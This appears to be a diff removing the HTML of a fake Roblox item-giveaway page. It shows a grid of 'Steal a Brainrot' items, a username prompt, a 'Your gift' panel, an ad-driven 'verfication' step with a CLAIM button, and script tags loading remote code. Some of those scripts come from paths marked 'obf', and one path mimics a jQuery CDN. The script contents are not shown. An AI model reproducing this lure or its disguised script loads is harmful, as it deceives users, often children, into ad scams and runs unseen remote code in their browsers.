-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Bulbito-Bandito-Traktorito.png" alt="Bulbito Bandito Traktorito"></div>
-    <div class="txt">Bulbito Bandito </div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tob-Tobi-Tobi.png" alt="Tob Tobi Tobi"></div>
-    <div class="txt">Tob Tobi Tobi</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Te-Te-Te-Sahur.png" alt="Te Te Te Sahur"></div>
-    <div class="txt">Te Te Te Sahur</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Orcalitos.png" alt="Los Orcalitos"></div>
-    <div class="txt">Los Orcalitos</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Esok-Sekolah.png" alt="Esok Sekolah"></div>
-    <div class="txt">Esok Sekolah</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Karkerkar-Kurkur.png" alt="Karkerkar Kurkur"></div>
-    <div class="txt">Karkerkar Kurkur</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Torrtuginni-Dragonfrutini-2.png" alt="Torrtuginni Dragonfrutini"></div>
-    <div class="txt">Torrtuginni Dragonfrutini</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Hotspot.png" alt="Los Hotspot"></div>
-    <div class="txt">Los Hotspot</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Combinasionas.png" alt="Los Combinasionas"></div>
-    <div class="txt">Los Combinasionas</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Ganganzelli-Trulala.png" alt="Ganganzelli Trulala"></div>
-    <div class="txt">Ganganzelli Trulala</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Agarrini-la-Palini.png" alt="Agarrini la Palini"></div>
-    <div class="txt">Agarrini la Palini</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Avocadorilla.png" alt="Avocadorilla"></div>
-    <div class="txt">Avocadorilla</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Pi-Pi-Watermelon.png" alt="Pi Pi Watermelon"></div>
-    <div class="txt">Pi Pi Watermelon</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Pipi-Corni.png" alt="Pipi Corni"></div>
-    <div class="txt">Pipi Corni</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Pipi-Avocado.png" alt="Pipi Avocado"></div>
-    <div class="txt">Pipi Avocado</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Cocosini-Mama.png" alt="Cocosini Mama"></div>
-    <div class="txt">Cocosini Mama</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/diamond-statutuni-libertino.webp" alt="Diamond Statutuni Libertino"></div>
-    <div class="txt"> Statutuni Libertino</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/gold-statutuni-libertino.webp" alt="Gold Statutuni Libertino"></div>
-    <div class="txt"> Statutuni Libertino</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/statutuni-libertino.webp" alt="Statutuni Libertino"></div>
-    <div class="txt">Statutuni Libertino</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/diamond-sammyni-spiderini.webp" alt="Diamond Sammyni Spiderini"></div>
-    <div class="txt"> Sammyni Spiderini</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Piccione-Macchina-2.png" alt="Piccione Macchina"></div>
-    <div class="txt">Piccione Macchina</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Gorillo-Watermelondrillo-300x300.png" alt="Gorillo Watermelondrillo"></div>
-    <div class="txt">Gorillo Watermelondrillo</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Chicleteira-Bicicleteira-300x300.png" alt="Chicleteira Bicicleteira"></div>
-    <div class="txt">Chicleteira Bicicleteira</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Salamino-Penguino-300x300.png" alt="Salamino Penguino"></div>
-    <div class="txt">Salamino Penguino</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Strawberelli-Flamingelli.png" alt="Strawberelli Flamingelli"></div>
-    <div class="txt">Strawberelli Flamingelli</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Crocodillitos-2.png" alt="Los Crocodillitos"></div>
-    <div class="txt">Los Crocodillitos</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Las-Vaquitas-Saturnitas-2.png" alt="Las Vaquitas Saturnitas"></div>
-    <div class="txt">Las Vaquitas Saturnitas</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Nuclearo-Dinossauro-3.png" alt="Nuclearo Dinossauro"></div>
-    <div class="txt">Nuclearo Dinossauro</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Gold.png" alt="Gold"></div>
-    <div class="txt">Gold</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/turbo.png" alt="Turbo"></div>
-    <div class="txt">Turbo</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/matteo.png" alt="Matteo"></div>
-    <div class="txt">Matteo</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Lava-Mutation.png" alt="Lava Mutation"></div>
-    <div class="txt">Lava Mutation</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Rainbow.png" alt="Rainbow"></div>
-    <div class="txt">Rainbow</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Celestial.png" alt="Celestial"></div>
-    <div class="txt">Celestial</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Candy.png" alt="Candy"></div>
-    <div class="txt">Candy</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Blood-moon.png" alt="Blood Moon"></div>
-    <div class="txt">Blood Moon</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Diamond.png" alt="Diamond"></div>
-    <div class="txt">Diamond</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/TigroligreFrutonni.png" alt="Tigroligre Frutonni"></div>
-    <div class="txt">Tigroligre Frutonni</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/OrcaleroOrcala.png" alt="Orcalero Orcala"></div>
-    <div class="txt">Orcalero Orcala</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/ZibraZubraZibralini.png" alt="Zibra Zubra Zibralini"></div>
-    <div class="txt"> Zubra Zibralini</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/TigrilliniWatermelini.png" alt="Tigrillini Watermelini"></div>
-    <div class="txt">Tigrillini Watermelini</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/SpioniroGolubiro.png" alt="Spioniro Golubiro"></div>
-    <div class="txt">Spioniro Golubiro</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/PotHotspot.png" alt="Pot Hotspot"></div>
-    <div class="txt">Pot Hotspot</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/TorrtuginniDragonfruti.png" alt="Torrtuginni Dragonfruti"></div>
-    <div class="txt">Torrtuginni Dragonfruti</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/RainbowGraipussMedussi.png" alt="Rainbow Graipuss Medussi"></div>
-    <div class="txt">Rainbow Graipuss Medussi</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/DiamondGraipussMedus.png" alt="Diamond Graipuss Medus"></div>
-    <div class="txt">Diamond Graipuss Medus</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/RainbowLaVaccaSaturnoSaturnita.png" alt="Rainbow La Vacca Saturno Saturnita"></div>
-    <div class="txt">Rainbow La Vacca Saturno Saturnita</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/GoldenTralaleroTralala.png" alt="Golden Tralalero Tralala"></div>
-    <div class="txt">Golden Tralalero Tralala</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/$1000000.png" alt="$1000000"></div>
-    <div class="txt">$1000000</div>
-  </div>
-</div>
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://tr.rbxcdn.com/180DAY-178986b13c3ddc14b00cd9d820ce36d5/150/150/Image/Webp/noFilter" alt="180DAY 1"></div>
-    <div class="txt">180DAY 1</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://tr.rbxcdn.com/180DAY-46392a150c74bd4a11aca80270077e96/150/150/Image/Webp/noFilter" alt="180DAY 2"></div>
-    <div class="txt">180DAY 2</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/GoldenLosTralaleritos.png" alt="Golden Los Tralaleritos"></div>
-    <div class="txt">Golden Los Tralaleritos</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/DiamondLosTralaleritos.png" alt="Diamond Los Tralaleritos"></div>
-    <div class="txt">Diamond Los Tralaleritos</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/GoldenLaVaccaSaturnoSaturnita.png" alt="Golden La Vacca Saturno Saturnita"></div>
-    <div class="txt">Golden La Vacca Saturno Saturnita</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/DiamondLaVaccaSaturnoSaturnita.png" alt="Diamond La Vacca Saturno Saturnita"></div>
-    <div class="txt">Diamond La Vacca Saturno Saturnita</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaGrandeCombinasion.png" alt="La Grande Combinasion"></div>
-    <div class="txt">La Grande Combinasion</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/OdinDinDinDun.png" alt="Odin Din Din Dun"></div>
-    <div class="txt">Odin Din Din Dun</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/TralaleroTralala.png" alt="Tralalero Tralala"></div>
-    <div class="txt">Tralalero Tralala</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/RainbowTralaleroTralala.png" alt="Rainbow Tralalero Tralala"></div>
-    <div class="txt">Rainbow Tralalero Tralala</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/RainbowOdinDinDinDun.png" alt="Rainbow Odin Din Din Dun"></div>
-    <div class="txt">Rainbow Odin Din Din Dun</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LosTralaleritos.png" alt="Los Tralaleritos"></div>
-    <div class="txt">Los Tralaleritos</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaVaccaSaturnoSaturnita.png" alt="La Vacca Saturno Saturnita"></div>
-    <div class="txt">La Vacca Saturno Saturnita</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/GraipussMedussi.png" alt="Graipuss Medussi"></div>
-    <div class="txt">Graipuss Medussi</div>
-  </div>
-</div>
-
-<div class="col-4 col-md-3">
-  <div class="item">
-    <div class="img"><img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/GoldenGraipussMedussi.png" alt="Golden Graipuss Medussi"></div>
-    <div class="txt">Golden Graipuss Medussi</div>
-  </div>
-</div>
-      </div>
-      <br><br><br>
-    </div>
-    <div id="last" class="last d-none">
-      <div class="search">
-        <input placeholder="Enter Username">
-        <button id="search">search</button>
-      </div>
-
-      <div class="profile d-none">
-        <div class="img"><img src=""></div>
-        <div class="username">@username</div>
-        <div class="more">
-          <div class="item"></div><div class="item"></div><div class="item"></div>
-        </div>
-      </div>
-
-      <div class="rewards d-none">
-        <div class="item">
-          <div>Your gift: </div>
-<div id="follow-val"></div>
-        </div>
-            </div>
-            <div class="no-user d-none">
-               <div class="img">
-               </div>
-            </div>
-            <div class="verfication d-none">
-               <div class="vpn d-none">
-               </div>
-               <div class="action-ads">
-                  <div class="send" onclick="_Wi()">CLAIM</div>
-               </div>
-            </div>
-            <div class="chat">
-        <div class="over"></div>
-        <div class="items"></div>
-      </div>
-    </div>
-  </div>
-  <div class="followers-next">
-    <div class="container-md">
-      <div class="action disabled">Next Step</div>
-    </div>
-  </div>
-  <div id="giftsContainer"></div>
-  <script src="https://cdn.jsdelivr.net/gh/dev20l/import@main/jesn.js"></script>
-  <script src="https://cdn.jsdelivr.net/gh/dev20l/obf@main/userfo.js"></script>
-  <script src="https://cdn.jsdelivr.net/gh/dev20l/obf@main/opat67s.js"></script>
-  <script src="https://cdn.jsdelivr.net/gh/dev20l/import@main/apirbx.js"></script>
-  <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/y.js"></script>
 </body>
 </html>
